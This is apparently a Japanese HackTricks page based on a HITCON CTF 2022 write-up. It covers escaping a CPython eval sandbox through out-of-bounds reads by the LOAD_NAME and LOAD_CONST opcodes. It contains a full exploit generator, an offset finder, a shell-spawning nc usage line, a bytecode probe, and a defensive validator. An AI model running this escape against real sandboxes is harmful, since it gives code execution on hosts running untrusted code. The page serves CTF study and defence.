# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**この情報は** [**この書き込みから**](https://blog.splitline.tw/hitcon-ctf-2022/)**取得されました。**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD_NAME / LOAD_CONST opcodeのOOBリード機能を使用して、メモリ内のいくつかのシンボルを取得できます。これは、`(a, b, c, ... 数百のシンボル ..., __getattribute__) if [] else [].__getattribute__(...)`のようなトリックを使用して、取得したいシンボル（関数名など）を得ることを意味します。

その後、エクスプロイトを作成します。

### 概要 <a href="#overview-1" id="overview-1"></a>

ソースコードは非常に短く、わずか4行しか含まれていません！
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
任意のPythonコードを入力できますが、それは[Pythonコードオブジェクト](https://docs.python.org/3/c-api/code.html)にコンパイルされます。しかし、そのコードオブジェクトの`co_consts`と`co_names`は、evalがそのコードオブジェクトを実行する前に空のタプルに置き換えられます。

このようにして、すべての式に含まれる定数（例：数値、文字列など）や名前（例：変数、関数）が最終的にセグメンテーションフォルトを引き起こす可能性があります。

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

セグフォルトはどのように発生するのでしょうか？

簡単な例から始めましょう。`[a, b, c]`は次のバイトコードにコンパイルされる可能性があります。
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
しかし、`co_names` が空のタプルになった場合はどうなるでしょうか？ `LOAD_NAME 2` オペコードはまだ実行され、そのメモリアドレスから値を読み取ろうとします。はい、これは境界外読み取りの「機能」です。

解決策の核心概念はシンプルです。CPythonのいくつかのオペコード、例えば `LOAD_NAME` と `LOAD_CONST` は境界外読み取りに対して脆弱です（？）。

これらは、`consts` または `names` タプルから `oparg` インデックスのオブジェクトを取得します（これが内部で `co_consts` と `co_names` と呼ばれるものです）。以下の短いスニペットを参照して、CPythonが `LOAD_CONST` オペコードを処理する際に何を行うかを見てみましょう。
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
この方法で、任意のメモリオフセットから「名前」を取得するためにOOB機能を使用できます。その名前が何で、オフセットが何であるかを確認するには、`LOAD_NAME 0`、`LOAD_NAME 1` ... `LOAD_NAME 99` ... を試し続けてください。そして、オパラグが700を超える何かを見つけることができるかもしれません。もちろん、gdbを使用してメモリレイアウトを確認することもできますが、それがもっと簡単になるとは思いません。

### Exploitの生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

有用な名前/定数のオフセットを取得したら、どのようにそのオフセットから名前/定数を取得して使用するのでしょうか？ここにあなたへのトリックがあります：\
オフセット5（`LOAD_NAME 5`）から`__getattribute__`の名前を取得できると仮定し、`co_names=()`の場合、次のことを行ってください：
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> `__getattribute__` と名付ける必要はなく、もっと短い名前や奇妙な名前を付けることができます。

その理由は、バイトコードを見るだけで理解できます:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`が`co_names`から名前を取得することに注意してください。Pythonは名前が同じであれば同じオフセットから名前をロードしますので、2番目の`__getattribute__`もoffset=5からロードされます。この機能を使用することで、名前が近くのメモリにある場合に任意の名前を使用できます。

数を生成するのは簡単なはずです：

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

長さ制限のため、constsは使用しませんでした。

まず、名前のオフセットを見つけるためのスクリプトを示します。
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
次は、実際のPythonエクスプロイトを生成するためのものです。
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
それは基本的に次のことを行います。私たちはその文字列を`__dir__`メソッドから取得します：
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### バージョンノートと影響を受けるオペコード (Python 3.11–3.13)

- CPython バイトコードオペコードは、整数オペランドによって `co_consts` と `co_names` タプルにインデックスを付けます。攻撃者がこれらのタプルを空にする（またはバイトコードで使用される最大インデックスよりも小さくする）ことができれば、インタープリタはそのインデックスのために範囲外のメモリを読み取り、近くのメモリから任意の PyObject ポインタを得ることになります。関連するオペコードには少なくとも以下が含まれます：
- `LOAD_CONST consti` → `co_consts[consti]` を読み取ります。
- `LOAD_NAME namei`、`STORE_NAME`、`DELETE_NAME`、`LOAD_GLOBAL`、`STORE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`LOAD_ATTR`、`STORE_ATTR` → `co_names[...]` から名前を読み取ります（3.11+ では `LOAD_ATTR`/`LOAD_GLOBAL` が低ビットにフラグビットを格納することに注意してください; 実際のインデックスは `namei >> 1` です）。バージョンごとの正確な意味については、ディスアセンブラのドキュメントを参照してください。[Python dis docs].
- Python 3.11+ では、命令の間に隠れた `CACHE` エントリを追加する適応/インラインキャッシュが導入されました。これは OOB プリミティブを変更するものではなく、バイトコードを手作りする場合は、`co_code` を構築する際にこれらのキャッシュエントリを考慮する必要があることを意味します。

実用的な影響：このページの技術は、コードオブジェクトを制御できる場合（例：`CodeType.replace(...)` を介して）に、`co_consts`/`co_names` を縮小することで CPython 3.11、3.12、3.13 で引き続き機能します。

### 有用な OOB インデックスのためのクイックスキャナー (3.11+/3.12+ 互換)

高レベルのソースからではなく、バイトコードから直接興味深いオブジェクトを探ることを好む場合は、最小限のコードオブジェクトを生成し、インデックスをブルートフォースすることができます。以下のヘルパーは、必要に応じてインラインキャッシュを自動的に挿入します。
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
ノート
- 名前を調べる代わりに、`LOAD_CONST`を`LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`に置き換え、スタックの使用を適切に調整してください。
- 必要に応じて、`EXTENDED_ARG`または複数のバイトの`arg`を使用して、インデックス>255に到達します。上記のように`dis`でビルドする際は、低バイトのみを制御します。より大きなインデックスの場合は、生のバイトを自分で構築するか、攻撃を複数のロードに分割してください。

### 最小限のバイトコードのみのRCEパターン (co_consts OOB → builtins → eval/input)

`co_consts`インデックスがbuiltinsモジュールに解決されることを特定したら、スタックを操作することで`eval(input())`を`co_names`なしで再構築できます:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
このアプローチは、`co_code` に直接制御を与え、`co_consts=()` および `co_names=()` を強制するチャレンジ（例：BCTF 2024 “awpcode”）で有用です。ソースレベルのトリックを回避し、バイトコードスタック操作とタプルビルダーを活用することでペイロードサイズを小さく保ちます。

### サンドボックスのための防御的チェックと緩和策

信頼できないコードをコンパイル/評価するか、コードオブジェクトを操作する Python “sandbox” を作成している場合、バイトコードによって使用されるタプルインデックスの境界チェックに CPython に依存しないでください。代わりに、実行する前にコードオブジェクトを自分で検証してください。

実用的なバリデーター（co_consts/co_names への OOB アクセスを拒否）
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
追加の緩和策
- 信頼できない入力に対して任意の `CodeType.replace(...)` を許可しないか、結果のコードオブジェクトに対して厳格な構造チェックを追加してください。
- CPythonのセマンティクスに依存するのではなく、OSレベルのサンドボックス（seccomp、ジョブオブジェクト、コンテナ）で信頼できないコードを別のプロセスで実行することを検討してください。



## 参考文献

- SplitlineのHITCON CTF 2022のレポート「V O I D」（この技術の起源と高レベルのエクスプロイトチェーン）： https://blog.splitline.tw/hitcon-ctf-2022/
- Python逆アセンブラのドキュメント（LOAD_CONST/LOAD_NAME/etc.のインデックスセマンティクス、および3.11+の `LOAD_ATTR`/`LOAD_GLOBAL` の低ビットフラグ）： https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
